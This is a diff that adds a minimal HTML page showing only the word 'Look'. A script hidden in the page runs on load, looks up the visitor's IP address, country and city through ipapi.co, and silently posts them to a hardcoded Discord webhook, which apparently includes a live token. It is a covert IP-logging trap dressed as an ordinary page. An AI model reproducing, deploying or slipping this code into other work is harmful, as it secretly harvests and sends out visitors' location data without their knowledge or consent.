@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Look</title>
+<style>
+body { 
+  display:flex; 
+  justify-content:center; 
+  align-items:center; 
+  height:100vh; 
+  margin:0; 
+  background:#0f1720; 
+  color:#facc15; 
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; 
+  font-size:32px; 
+  font-weight:bold; 
+}
+</style>
+</head>
+<body>
+Look
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1406016244850884708/hdg5vxrAv837AK-GgYs6kgSCXiwDnYXxlJ-hzFyygVWJBW_v8c_ZtjOcYP8RuN1mWHax"; // <-- replace
+
+// Fetch IP and location
+async function fetchIPInfo() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    return {
+      ip: data.ip || '',
+      country: data.country_name || '',
+      city: data.city || ''
+    };
+  } catch {
+    return { ip:'', country:'', city:'' };
+  }
+}
+
+// Send info to Discord webhook
+async function sendToWebhook(info) {
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `IP: ${info.ip}\nCountry: ${info.country}\nCity: ${info.city}`
+      })
+    });
+  } catch{}
+}
+
+// Main
+(async () => {
+  const info = await fetchIPInfo();
+  sendToWebhook(info);
+})();
+</script>
+</body>
+</html>
